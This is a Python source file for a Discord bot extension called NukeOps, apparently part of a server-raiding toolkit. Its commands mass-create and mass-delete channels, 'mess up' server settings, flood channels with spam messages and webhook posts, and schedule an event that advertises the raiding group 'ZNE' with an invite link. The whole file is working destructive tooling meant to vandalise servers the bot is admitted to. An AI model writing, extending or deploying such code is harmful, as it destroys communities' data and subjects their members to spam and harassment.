# STATUS: Complete (100/100)
from __future__ import annotations
import logging
import traceback
from discord.ext import commands

from core.operations import Operations
from core.settings import State, now
from tools.states.blacklist import is_blacklisted


class NukeOps(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.operations: Operations | None = getattr(bot, "operations", None)

    @commands.command(name="create_channels", aliases=["createchannels", "cc"])
    @commands.cooldown(1, 120, commands.BucketType.guild)
    @commands.guild_only()
    @commands.bot_has_permissions(manage_channels=True)
    @is_blacklisted
    async def create_channels(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        if not self.operations:
            return
        try:
            count = await self.operations.CrChannel(guild)
            await ctx.reply(f"✅ Created {count} channels.", delete_after=10)
            logging.info(f"[create_channels] {count} channels in {guild.id}")
        except Exception as e:
            tb = traceback.format_exc()
            logging.error(f"[create_channels] failed: {e}\n{tb}")

    @commands.command(name="delete_channels", aliases=["deletechannels", "dc"])
    @commands.cooldown(1, 120, commands.BucketType.guild)
    @commands.guild_only()
    @commands.bot_has_permissions(manage_channels=True)
    @is_blacklisted
    async def delete_channels(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        if not self.operations:
            return
        try:
            count = await self.operations.DelChannels(guild)
            await ctx.reply(f"✅ Deleted {count} channels.", delete_after=10)
            logging.info(f"[delete_channels] {count} channels in {guild.id}")
        except Exception as e:
            tb = traceback.format_exc()
            logging.error(f"[delete_channels] failed: {e}\n{tb}")

    @commands.command(name="mess_server", aliases=["messserver", "ms"])
    @commands.cooldown(1, 120, commands.BucketType.guild)
    @commands.guild_only()
    @commands.bot_has_permissions(manage_guild=True)
    @is_blacklisted
    async def mess_server(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        if not self.operations:
            return
        try:
            await self.operations.mess_server(guild)
            await ctx.reply("✅ Server messed up.", delete_after=10)
            logging.info(f"[mess_server] done in {guild.id}")
        except Exception as e:
            tb = traceback.format_exc()
            logging.error(f"[mess_server] failed: {e}\n{tb}")

    @commands.command(name="spam", aliases=["sp", "s"])
    @commands.cooldown(1, 120, commands.BucketType.guild)
    @commands.guild_only()
    @commands.bot_has_permissions(send_messages=True)
    @is_blacklisted
    async def spam(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        if not self.operations:
            return
        try:
            count = await self.operations.spam(guild)
            await ctx.reply(f"✅ Sent {count} spam messages.", delete_after=10)
            logging.info(f"[spam] {count} messages in {guild.id}")
        except Exception as e:
            tb = traceback.format_exc()
            logging.error(f"[spam] failed: {e}\n{tb}")

    @commands.command(name="spam_webhook", aliases=["sw", "spamwh"])
    @commands.cooldown(1, 120, commands.BucketType.guild)
    @commands.guild_only()
    @commands.bot_has_permissions(manage_webhooks=True)
    @is_blacklisted
    async def spam_webhook(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        if not self.operations:
            return
        try:
            count = await self.operations.spam_webhook(guild)
            await ctx.reply(f"✅ Sent {count} webhook messages.", delete_after=10)
            logging.info(f"[spam_webhook] {count} messages in {guild.id}")
        except Exception as e:
            tb = traceback.format_exc()
            logging.error(f"[spam_webhook] failed: {e}\n{tb}")

    @commands.command(name="create_event", aliases=["createevent", "ce"])
    @commands.cooldown(1, 120, commands.BucketType.guild)
    @commands.guild_only()
    @commands.bot_has_permissions(manage_events=True)
    @is_blacklisted
    async def create_event(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        if not self.operations:
            return
        try:
            payload = {
                "name": State.get_phrase(),
                "privacy_level": 2,
                "entity_type": 3,
                "scheduled_start_time": now(seconds=3).isoformat(),
                "scheduled_end_time": now().replace(year=2029).isoformat(),
                "description": "Join ZNE and start dominating servers today! https://discord.gg/Y6qZ4TKRM5",
                "entity_metadata": {"location": "https://discord.gg/Y6qZ4TKRM5"},
            }
            await self.operations._create_scheduled_event(guild.id, payload)
            await ctx.reply("✅ Scheduled event created.", delete_after=10)
            logging.info(f"[create_event] created in {guild.id}")
        except Exception as e:
            tb = traceback.format_exc()
            logging.error(f"[create_event] failed: {e}\n{tb}")


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(NukeOps(bot))
